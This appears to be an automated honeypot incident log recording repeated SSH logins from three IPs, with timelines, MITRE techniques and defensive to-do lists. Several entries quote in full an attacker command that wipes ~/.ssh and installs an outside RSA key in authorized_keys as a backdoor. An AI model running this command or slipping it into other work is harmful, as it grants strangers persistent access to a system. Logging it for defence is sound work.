| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:28:06` | `cowrie.session.connect` |
| `2026-04-10 19:28:06` | `cowrie.client.version` |
| `2026-04-10 19:28:06` | `cowrie.client.kex` |
| `2026-04-10 19:28:06` | `cowrie.login.success` |
| `2026-04-10 19:28:07` | `cowrie.session.params` |
| `2026-04-10 19:28:07` | `cowrie.command.input` |
| `2026-04-10 19:28:07` | `cowrie.command.failed` |
| `2026-04-10 19:28:07` | `cowrie.log.closed` |
| `2026-04-10 19:28:07` | `cowrie.session.params` |
| `2026-04-10 19:28:07` | `cowrie.command.input` |
| `2026-04-10 19:28:07` | `cowrie.session.file_download` |
| `2026-04-10 19:28:07` | `cowrie.log.closed` |
| `2026-04-10 19:28:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.112.42[.]129` to AbuseIPDB if not already reported
- [ ] Block `42.112.42[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2596ef8c465

| Field | Detail |
|---|---|
| **Source IP** | `42.112.42[.]129` |
| **First Seen** | 2026-04-10 19:28 |
| **Last Seen** | 2026-04-10 19:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:28:09` | `cowrie.session.connect` |
| `2026-04-10 19:28:09` | `cowrie.client.version` |
| `2026-04-10 19:28:09` | `cowrie.client.kex` |
| `2026-04-10 19:28:10` | `cowrie.login.success` |
| `2026-04-10 19:28:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.112.42[.]129` to AbuseIPDB if not already reported
- [ ] Block `42.112.42[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e1dd7332f41

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-04-10 19:31 |
| **Last Seen** | 2026-04-10 19:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:31:41` | `cowrie.session.connect` |
| `2026-04-10 19:31:41` | `cowrie.client.version` |
| `2026-04-10 19:31:41` | `cowrie.client.kex` |
| `2026-04-10 19:31:42` | `cowrie.login.success` |
| `2026-04-10 19:31:42` | `cowrie.session.params` |
| `2026-04-10 19:31:42` | `cowrie.command.input` |
| `2026-04-10 19:31:42` | `cowrie.command.failed` |
| `2026-04-10 19:31:42` | `cowrie.log.closed` |
| `2026-04-10 19:31:42` | `cowrie.session.params` |
| `2026-04-10 19:31:42` | `cowrie.command.input` |
| `2026-04-10 19:31:42` | `cowrie.session.file_download` |
| `2026-04-10 19:31:42` | `cowrie.log.closed` |
| `2026-04-10 19:31:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48ee8fa58598

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-04-10 19:31 |
| **Last Seen** | 2026-04-10 19:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:31:43` | `cowrie.session.connect` |
| `2026-04-10 19:31:43` | `cowrie.client.version` |
| `2026-04-10 19:31:43` | `cowrie.client.kex` |
| `2026-04-10 19:31:44` | `cowrie.login.success` |
| `2026-04-10 19:31:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6bb01077f45

| Field | Detail |
|---|---|
| **Source IP** | `103.82.37[.]117` |
| **First Seen** | 2026-04-10 19:32 |
| **Last Seen** | 2026-04-10 19:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:32:22` | `cowrie.session.connect` |
| `2026-04-10 19:32:22` | `cowrie.client.version` |
| `2026-04-10 19:32:22` | `cowrie.client.kex` |
| `2026-04-10 19:32:22` | `cowrie.login.success` |
| `2026-04-10 19:32:23` | `cowrie.session.params` |
| `2026-04-10 19:32:23` | `cowrie.command.input` |
| `2026-04-10 19:32:23` | `cowrie.command.failed` |
| `2026-04-10 19:32:23` | `cowrie.log.closed` |
| `2026-04-10 19:32:23` | `cowrie.session.params` |
| `2026-04-10 19:32:23` | `cowrie.command.input` |
| `2026-04-10 19:32:23` | `cowrie.session.file_download` |
| `2026-04-10 19:32:23` | `cowrie.log.closed` |
| `2026-04-10 19:32:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.37[.]117` to AbuseIPDB if not already reported
- [ ] Block `103.82.37[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64a1a023ea34

| Field | Detail |
|---|---|
| **Source IP** | `103.82.37[.]117` |
| **First Seen** | 2026-04-10 19:32 |
| **Last Seen** | 2026-04-10 19:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:32:25` | `cowrie.session.connect` |
| `2026-04-10 19:32:25` | `cowrie.client.version` |
| `2026-04-10 19:32:25` | `cowrie.client.kex` |
| `2026-04-10 19:32:26` | `cowrie.login.success` |
| `2026-04-10 19:32:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.37[.]117` to AbuseIPDB if not already reported
- [ ] Block `103.82.37[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ad2645e96c5

| Field | Detail |
|---|---|
| **Source IP** | `42.112.42[.]129` |
| **First Seen** | 2026-04-10 19:33 |
| **Last Seen** | 2026-04-10 19:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:33:44` | `cowrie.session.connect` |
| `2026-04-10 19:33:44` | `cowrie.client.version` |
| `2026-04-10 19:33:44` | `cowrie.client.kex` |
| `2026-04-10 19:33:44` | `cowrie.login.success` |
| `2026-04-10 19:33:45` | `cowrie.session.params` |
| `2026-04-10 19:33:45` | `cowrie.command.input` |
| `2026-04-10 19:33:45` | `cowrie.command.failed` |
| `2026-04-10 19:33:45` | `cowrie.log.closed` |
| `2026-04-10 19:33:45` | `cowrie.session.params` |
| `2026-04-10 19:33:45` | `cowrie.command.input` |
| `2026-04-10 19:33:45` | `cowrie.session.file_download` |
| `2026-04-10 19:33:45` | `cowrie.log.closed` |
| `2026-04-10 19:33:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.112.42[.]129` to AbuseIPDB if not already reported
- [ ] Block `42.112.42[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba278c471759

| Field | Detail |
|---|---|
| **Source IP** | `42.112.42[.]129` |
| **First Seen** | 2026-04-10 19:33 |
| **Last Seen** | 2026-04-10 19:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:33:47` | `cowrie.session.connect` |
| `2026-04-10 19:33:47` | `cowrie.client.version` |
| `2026-04-10 19:33:47` | `cowrie.client.kex` |
| `2026-04-10 19:33:48` | `cowrie.login.success` |
| `2026-04-10 19:33:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.112.42[.]129` to AbuseIPDB if not already reported
- [ ] Block `42.112.42[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e783e0b42b3b

| Field | Detail |
|---|---|
| **Source IP** | `103.82.37[.]117` |
| **First Seen** | 2026-04-10 19:34 |
| **Last Seen** | 2026-04-10 19:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:34:04` | `cowrie.session.connect` |
| `2026-04-10 19:34:04` | `cowrie.client.version` |
| `2026-04-10 19:34:04` | `cowrie.client.kex` |
| `2026-04-10 19:34:05` | `cowrie.login.success` |
| `2026-04-10 19:34:05` | `cowrie.session.params` |
| `2026-04-10 19:34:05` | `cowrie.command.input` |
| `2026-04-10 19:34:05` | `cowrie.command.failed` |
| `2026-04-10 19:34:05` | `cowrie.log.closed` |
| `2026-04-10 19:34:05` | `cowrie.session.params` |
| `2026-04-10 19:34:05` | `cowrie.command.input` |
| `2026-04-10 19:34:05` | `cowrie.session.file_download` |
| `2026-04-10 19:34:05` | `cowrie.log.closed` |
| `2026-04-10 19:34:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.37[.]117` to AbuseIPDB if not already reported
- [ ] Block `103.82.37[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac2007edbf0f

| Field | Detail |
|---|---|
| **Source IP** | `103.82.37[.]117` |
| **First Seen** | 2026-04-10 19:34 |
| **Last Seen** | 2026-04-10 19:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:34:07` | `cowrie.session.connect` |
| `2026-04-10 19:34:07` | `cowrie.client.version` |
| `2026-04-10 19:34:07` | `cowrie.client.kex` |
| `2026-04-10 19:34:08` | `cowrie.login.success` |
| `2026-04-10 19:34:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.37[.]117` to AbuseIPDB if not already reported
- [ ] Block `103.82.37[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-108aecdc7efc

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-04-10 19:36 |
| **Last Seen** | 2026-04-10 19:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:36:16` | `cowrie.session.connect` |
| `2026-04-10 19:36:16` | `cowrie.client.version` |
| `2026-04-10 19:36:16` | `cowrie.client.kex` |
| `2026-04-10 19:36:16` | `cowrie.login.success` |
| `2026-04-10 19:36:16` | `cowrie.session.params` |
| `2026-04-10 19:36:16` | `cowrie.command.input` |
| `2026-04-10 19:36:16` | `cowrie.command.failed` |
| `2026-04-10 19:36:16` | `cowrie.log.closed` |
| `2026-04-10 19:36:16` | `cowrie.session.params` |
| `2026-04-10 19:36:16` | `cowrie.command.input` |
| `2026-04-10 19:36:16` | `cowrie.session.file_download` |
| `2026-04-10 19:36:16` | `cowrie.log.closed` |
| `2026-04-10 19:36:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ab70148c22c

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-04-10 19:36 |
| **Last Seen** | 2026-04-10 19:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:36:18` | `cowrie.session.connect` |
| `2026-04-10 19:36:18` | `cowrie.client.version` |
| `2026-04-10 19:36:18` | `cowrie.client.kex` |
| `2026-04-10 19:36:18` | `cowrie.login.success` |
| `2026-04-10 19:36:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0c92e551974

| Field | Detail |
|---|---|
| **Source IP** | `103.82.37[.]117` |
| **First Seen** | 2026-04-10 19:37 |
| **Last Seen** | 2026-04-10 19:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:37:37` | `cowrie.session.connect` |
| `2026-04-10 19:37:37` | `cowrie.client.version` |
| `2026-04-10 19:37:37` | `cowrie.client.kex` |
| `2026-04-10 19:37:38` | `cowrie.login.success` |
| `2026-04-10 19:37:38` | `cowrie.session.params` |
| `2026-04-10 19:37:38` | `cowrie.command.input` |
| `2026-04-10 19:37:38` | `cowrie.command.failed` |
| `2026-04-10 19:37:38` | `cowrie.log.closed` |
| `2026-04-10 19:37:38` | `cowrie.session.params` |
| `2026-04-10 19:37:38` | `cowrie.command.input` |
| `2026-04-10 19:37:39` | `cowrie.session.file_download` |
| `2026-04-10 19:37:39` | `cowrie.log.closed` |
| `2026-04-10 19:37:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.37[.]117` to AbuseIPDB if not already reported
- [ ] Block `103.82.37[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2de2bb88fe48

| Field | Detail |
|---|---|
| **Source IP** | `103.82.37[.]117` |
| **First Seen** | 2026-04-10 19:37 |
| **Last Seen** | 2026-04-10 19:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:37:40` | `cowrie.session.connect` |
| `2026-04-10 19:37:40` | `cowrie.client.version` |
| `2026-04-10 19:37:40` | `cowrie.client.kex` |
| `2026-04-10 19:37:41` | `cowrie.login.success` |
| `2026-04-10 19:37:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.82.37[.]117` to AbuseIPDB if not already reported
- [ ] Block `103.82.37[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-666ba7a195ea

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-04-10 19:38 |
| **Last Seen** | 2026-04-10 19:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:38:37` | `cowrie.session.connect` |
| `2026-04-10 19:38:37` | `cowrie.client.version` |
| `2026-04-10 19:38:37` | `cowrie.client.kex` |
| `2026-04-10 19:38:37` | `cowrie.login.success` |
| `2026-04-10 19:38:37` | `cowrie.session.params` |
| `2026-04-10 19:38:37` | `cowrie.command.input` |
| `2026-04-10 19:38:37` | `cowrie.command.failed` |
| `2026-04-10 19:38:37` | `cowrie.log.closed` |
| `2026-04-10 19:38:37` | `cowrie.session.params` |
| `2026-04-10 19:38:37` | `cowrie.command.input` |
| `2026-04-10 19:38:37` | `cowrie.session.file_download` |
| `2026-04-10 19:38:37` | `cowrie.log.closed` |
| `2026-04-10 19:38:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e769de3d51d

| Field | Detail |
|---|---|
| **Source IP** | `34.0.13[.]61` |
| **First Seen** | 2026-04-10 19:38 |
| **Last Seen** | 2026-04-10 19:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:38:39` | `cowrie.session.connect` |
| `2026-04-10 19:38:39` | `cowrie.client.version` |
| `2026-04-10 19:38:39` | `cowrie.client.kex` |
| `2026-04-10 19:38:39` | `cowrie.login.success` |
| `2026-04-10 19:38:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.0.13[.]61` to AbuseIPDB if not already reported
- [ ] Block `34.0.13[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d39322f90fb

| Field | Detail |
|---|---|
| **Source IP** | `42.112.42[.]129` |
| **First Seen** | 2026-04-10 19:39 |
| **Last Seen** | 2026-04-10 19:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 19:39:28` | `cowrie.session.connect` |
| `2026-04-10 19:39:28` | `cowrie.client.version` |
| `2026-04-10 19:39:28` | `cowrie.client.kex` |
| `2026-04-10 19:39:29` | `cowrie.login.success` |
| `2026-04-10 19:39:29` | `cowrie.session.params` |
| `2026-04-10 19:39:29` | `cowrie.command.input` |
